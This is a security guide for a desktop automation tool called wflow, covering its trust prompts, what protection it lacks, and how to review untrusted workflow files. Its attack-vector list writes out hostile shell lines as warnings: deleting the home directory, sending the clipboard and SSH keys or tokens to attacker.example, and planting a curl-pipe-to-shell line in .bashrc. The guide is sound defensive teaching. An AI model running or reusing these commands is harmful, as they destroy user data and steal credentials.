# Reviewing untrusted workflows

A wflow workflow is plain text that ultimately executes shell commands,
keystrokes, mouse clicks, and clipboard writes. Running someone else's
`.kdl` file is the same risk surface as running someone else's shell
script: arbitrary code execution.

This page describes how wflow protects you, what it does *not* protect
against, and the commands you should run before trusting any workflow
that didn't originate on your machine.

## What wflow does on your behalf

- **First-run prompt.** Any workflow file `wflow run` reads that wasn't
  authored on this machine — i.e., not in `~/.config/wflow/trusted_workflows`
  for that exact (path, content) pair — triggers a prompt. The prompt
  prints the title, step count, and a categorized list of what the
  workflow will do, with `shell` and `clipboard` lines highlighted. You
  type `y` to proceed.
- **Trust is keyed by (path, hash).** Editing the file invalidates trust
  (the SHA-256 changes). Moving the file invalidates trust (the path
  changes). Both are deliberate — a workflow is the file at this path
  with this content, and either changing means you should re-confirm.
- **Auto-trust for files wflow itself wrote.** `wflow new`, `wflow edit`
  (after save), and the GUI editor all mark their saved files trusted.
  You don't get prompted for your own workflows.
- **Non-TTY without `--yes` errors loudly** instead of silently blocking
  on a prompt. cron and scripts must opt in with `--yes`.

The trust store lives at `~/.config/wflow/trusted_workflows`. Each line
mirrors `sha256sum`'s format (`<sha256-hex>  <absolute-path>`), so it's
human-readable and you can diff or grep it freely.

## What wflow does NOT do

- **No cryptographic signing.** A workflow file isn't signed by the
  author. wflow has no way to tell you a file came from someone you
  trust beyond "I ran it once and confirmed it." Don't rely on the
  trust store as a proof of provenance.
- **No sandboxing.** Once you confirm, shell commands run with your full
  user privilege. wflow doesn't drop capabilities, doesn't unshare a
  filesystem namespace, and doesn't filter syscalls.
- **No content scanning.** wflow doesn't look at the shell commands and
  decide they're "safe." A workflow with `shell "rm -rf $HOME"` and a
  workflow with `shell "ls"` look identical to the trust check — the
  only difference is what *you* see in the prompt.
- **No protection against legitimate-looking but malicious automation.**
  A `notify` action with body "Hello!" can sit alongside a `shell`
  action that exfiltrates data. The prompt shows both; you have to
  read it.

## Attack vectors to watch for

These are the patterns that have shown up in the wild for similar
automation tools (AutoHotkey, Hammerspoon, AutoKey). Read every
`shell` and `clipboard` step in an untrusted workflow before you say
yes:

1. **The obvious destructor.**
   `shell "rm -rf $HOME"`,
   `shell "dd if=/dev/zero of=$HOME/important.db"`,
   `shell "find / -name '*.kdl' -delete"`.
   These are the easy ones — the prompt shows them by category.

2. **Clipboard exfiltration.**
   `shell "wl-paste | curl -d @- https://attacker.example/cb"`.
   You're already running things that touch the clipboard; an extra
   step that *exports* the clipboard isn't visually distinct from
   anything else in the workflow.

3. **Credential harvesting.**
   `shell "cat ~/.ssh/id_ed25519 ~/.ssh/known_hosts | curl ..."`,
   `shell "cat ~/.netrc"`,
   `shell "echo $GITHUB_TOKEN | base64 | curl ..."`.
   Workflow shell runs in your environment with your env vars.

4. **Persistence.**
   `shell "echo 'curl evil | sh' >> ~/.bashrc"`,
   `shell "cp /tmp/payload ~/.local/bin/wflow-helper && chmod +x ..."`.
   A short workflow that installs a longer-running thing.

5. **Pipe-to-shell.**
   `shell "curl -fsSL https://example.com/install.sh | sh"`.
   Even if the URL looks legit, it's a remote-controlled execution
   path. The remote can change at any time.

6. **Social engineering through naming.**
   A workflow titled "Fix Firefox window snapping" that, in step 7,
   shells out somewhere unexpected. The title doesn't tell you what
   the workflow does — only the steps do.

## Safety checks before you confirm

Before saying yes to an untrusted workflow:

```sh
wflow show <path>            # human-readable list of every step
wflow run --explain <path>   # exact subprocess command lines (no execution)
```

`wflow run --explain` is the strongest check — it prints the literal
shell command, wdotool argv, and notify-send invocation each step
would generate. Read every line. If anything looks unfamiliar, don't
run it.

## If you change your mind

Forget what you trusted:

```sh
# View the trust store
$EDITOR ~/.config/wflow/trusted_workflows

# Remove the line for a specific path, or wipe everything
rm ~/.config/wflow/trusted_workflows
```

Next `wflow run` of any previously-trusted file will re-prompt.

## What to expect from future versions

Cryptographic signing and a notion of "trusted publisher" may land if
demand surfaces (post-v0.3). The current model is intentionally minimal:
make sure you've read what's about to run. Anything beyond that — a
sandbox, signed authors, content scanners — adds complexity that
doesn't pay for itself until there's a real ecosystem of shared
workflows.

For threat reports or security questions, file an issue or contact the
maintainer.
